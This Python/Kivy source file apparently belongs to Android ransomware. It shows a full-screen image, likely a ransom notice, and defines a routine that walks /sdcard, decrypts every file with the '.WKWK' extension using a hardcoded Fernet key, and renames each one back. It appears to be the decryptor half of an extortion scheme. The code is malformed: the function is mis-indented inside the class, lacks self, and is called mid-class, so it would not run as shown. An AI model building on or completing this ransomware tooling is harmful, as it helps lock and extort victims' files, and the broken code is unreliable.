from kivy.app import App
from kivy.uix.image import Image
from kivy.core.window import Window
from cryptography.fernet import Fernet
import os

class ImageApp(App):
        def decrypt_files(directory, key):
    crypt_fernet = Fernet(key)
    for sdcard, dirs, files in os.walk(directory):
        for file in files:
            fname, fext = os.path.splitext(file)
            fext = fext[1:]
            if fext == "WKWK":
                target_file = os.path.join(sdcard, file)
                with open(target_file, "r+b") as f:
                    file_data = f.read()
                    f.seek(0)
                    f.write(crypt_fernet.decrypt(file_data))
                    f.truncate()
                new_file = os.path.join(sdcard, fname)
                os.rename(target_file, new_file)
                
decrypt_files("/sdcard", b"gLk9xj4g-SCvW6e8yNdEIXUnIkwRXWpz12KI9rZXVmo=")                
    def build(self):
        # Set window size to portrait mode
        Window.size = (360, 640)
        # Set window to full screen mode
        Window.fullscreen = 'auto'
        image = Image(source='%(source.dir)s/data/gambar.jpg')
        return image

if __name__ == "__main__":
    ImageApp().run()
